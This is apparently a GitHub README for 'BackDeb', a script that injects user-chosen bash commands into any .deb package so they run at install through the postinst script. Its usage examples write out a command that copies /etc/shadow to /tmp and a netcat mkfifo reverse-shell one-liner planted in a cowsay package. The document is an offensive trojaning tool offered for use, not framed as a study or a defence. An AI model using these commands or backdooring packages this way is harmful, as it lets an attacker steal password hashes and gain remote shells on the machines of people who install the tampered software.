# BackDeb
Simple script to inject bash script inside any .deb package. It utilises postinst scripts as a medium to run user defined bash script. This script depends on dpkg-deb command line to achieve it's task, so make sure you have it on your system.

# Install
```
git clone https://github.com/diego-tella/BackDeb/
cd BackDeb/
chmod +x backdeb.sh
./backdeb.sh
```

# Usage
You can pass the .deb package as the first argument and the bash script to be executed as the second argument.
```
./backdeb.sh file.deb "cat /etc/shadow > /tmp/shadow"
```
The bash script needs to be in double quotes.<br><br>
Get a reverse shell:
```
./backdeb.sh cowsay_3.03+dfsg2-8_all.deb "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f"
```
# Requisites
<li>dpkg-deb</li>
